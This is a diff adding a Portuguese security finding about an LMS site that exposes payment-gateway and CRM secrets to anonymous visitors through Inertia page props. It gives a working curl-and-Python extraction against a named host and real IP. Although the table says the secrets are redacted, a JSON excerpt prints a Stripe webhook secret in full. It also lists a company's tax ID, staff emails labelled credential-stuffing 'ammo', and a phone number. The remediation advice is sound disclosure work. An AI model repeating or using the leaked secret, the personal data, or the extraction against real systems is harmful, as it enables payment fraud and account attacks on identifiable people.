@@ -1,0 +1,105 @@
+# F-013 — Credenciais de gateway e segredos expostos via Inertia page props (não-autenticado)
+
+| Campo | Valor |
+|-------|-------|
+| **Severidade** | CRÍTICA |
+| **Host** | `painel.andresan.com.br` (IP real 187.127.31.48, fora Cloudflare) |
+| **Endpoint** | `GET /auth` (e `GET /entrar`) |
+| **Autenticação** | Nenhuma (anônimo) |
+| **CWE** | CWE-200 (Exposição de Informação a Atores Não-Autorizados) / CWE-522 (Credenciais Insuficientemente Protegidas) |
+| **Plataforma** | Laravel + Inertia.js (edustore LMS SaaS), componente `Auth/SigninMatrix` |
+| **Status** | Confirmado |
+
+## Descrição
+
+O endpoint público de autenticação (`/auth`) da plataforma edustore retorna, no
+atributo `data-page="..."` do elemento `<div id="app">` (props do Inertia
+compartilhadas com qualquer visitante), todo o conjunto de configurações de
+plugins/gateways de pagamento **com segredos em texto claro**. Qualquer visitante
+anônimo recebe, sem login, chaves de API, segredos de webhook e credenciais de
+integração de gateways (Stripe, Asaas/Pagar.me, RD Station).
+
+## Reprodução
+
+```bash
+# 1. Requisição anônima ao /auth (Laravel+Inertia)
+curl -sk -H "Host: painel.andresan.com.br" https://187.127.31.48/auth \
+  -o /tmp/auth.html
+
+# 2. Extrair props do Inertia (JSON no atributo data-page)
+python3 -c '
+import re,html,json
+d=open("/tmp/auth.html",encoding="utf-8",errors="replace").read()
+m=re.search(r"data-page=\"([^\"]*)\"",d)
+j=json.loads(html.unescape(m.group(1)))
+print(json.dumps(j["props"]["active_plugins"],ensure_ascii=False,indent=2))
+'
+```
+
+## Segredos expostos (verificados em texto claro no JSON retornado a anônimos)
+
+> Segredos completos em `loot/secrets.txt` (fora do git). Abaixo, redigidos.
+
+| Segredo | Config name | Valor (redigido) | Observação |
+|---------|-------------|------------------|------------|
+| Stripe webhook secret | `webhook_token` | `whsec__6oHr_bc...eOR3SA` | **Segredo de assinatura de webhook Stripe** — permite forjar notificações de pagamento |
+| RD Station API code | `lead_tracker_api_code` | `d2b138ca...44961` | Integração CRM (RD Station) |
+| RD Station API secret | `lead_tracker_api_secret` | `faeaa291...254c0d`... | Segredo da integração RD |
+| Gateway API key (UUID) | `api_key` | `31845260-27dc-...3ed9aa` | Chave de API de gateway (plan_id=2) |
+| Gateway secret | `secret` | `MuOSyERq...7oow` | Segredo de plugin (app_id=edustore) |
+| Gateway key (mascarada) | — | `a3f8****e238` | Parcialmente exposta |
+
+Contexto JSON confirmado (exemplo, webhook Stripe):
+```
+"context": "Token enviado pelo gateway no header do webhook. Valida a origem das notificações.",
+ "allow_edit": true, "config_name": "webhook_token",
+ "config_value": "whsec__6oHr_bcLl7BJImb505qND0iGCaKKGNuB0Ah8eOR3SA"
+```
+
+## Outros dados sensíveis expostos no mesmo endpoint (não-autenticado)
+
+- **Empresa**: Andresan Cursos — CNPJ `42319575000111`, address_id 5925,
+  recipient_email `andresancursos@gmail.com`, sender_email `contato@edustore.online`,
+  valor mensal LMS R$2299,80.
+- **E-mails internos vazados** (ammo para cred-stuffing): andresancursos@gmail.com,
+  atendimento@andresan.com.br, atendimento@professorandresan.com.br,
+  gerencia@professorandresan.com.br, contato@edustore.online,
+  william@otimizacontabilidade.com.br, douglas@otimizacontabilidade.com.br.
+- **Gateways de pagamento ativos**: Presencial, Asaas Gateway, Gratuidade,
+  Pagar.me V5, E-rede (com IDs e plugin_ids).
+- **Status financeiro / AI quota**: `ai_quota_status` (saldo gratuito 3000,
+  saldo pago 1244.40), `financial_status` (mapeamento de status de cobrança),
+  `nf_steps` (integração Omie).
+- **Configs públicas**: telefones/WhatsApp (51992595446), redes sociais.
+- **Flags de segurança**: `email_verification_enabled=false`,
+  `captcha_hardened_enabled=true`, `production=true`.
+
+## Impacto
+
+1. **Acesso a sistemas financeiros externos**: segredo de webhook Stripe e chaves
+   de API de gateways (Asaas/Pagar.me) permitem forjar confirmações de pagamento,
+   consultar transações, manipular status de cobrança — impacto financeiro direto.
+2. **Acesso a CRM (RD Station)**: code+secret permitem operar a conta de CRM,
+   vazar leads/dados de clientes.
+3. **Vetor de acesso indireto à plataforma**: e-mails internos vazados são ammo
+   de cred-stuffing contra `/login` (rate-limitado em ~5/min, mas os endereços
+   internos agora são conhecidos).
+4. **PII/segredo de negócio**: CNPJ, contrato de LMS, margens, dados de
+  contabilidade expostos.
+
+## Recomendação
+
+- NÃO compartilhar `active_plugins` (com `config_value` de segredos) nas props
+  Inertia de páginas públicas. Criar props separadas só com metadados
+  não-sensíveis para a view de login; servir configs de gateway somente após
+  autenticação e com autorização por role.
+- Rotacionar imediatamente: segredo de webhook Stripe, chaves de API dos
+  gateways (Asaas/Pagar.me), credenciais RD Station.
+- Adicionar policy de autorização no controller que monta as props de login
+  (ocultar `active_plugins`, `gateways`, `company`, `ai_quota_status`).
+
+## Evidência
+
+- Props completas (JSON): `loot/inertia_auth_props.json` (fora do git)
+- Segredos completos: `loot/secrets.txt` (fora do git)
+- Captura de tela/HTML bruto do /auth: disponível sob solicitação
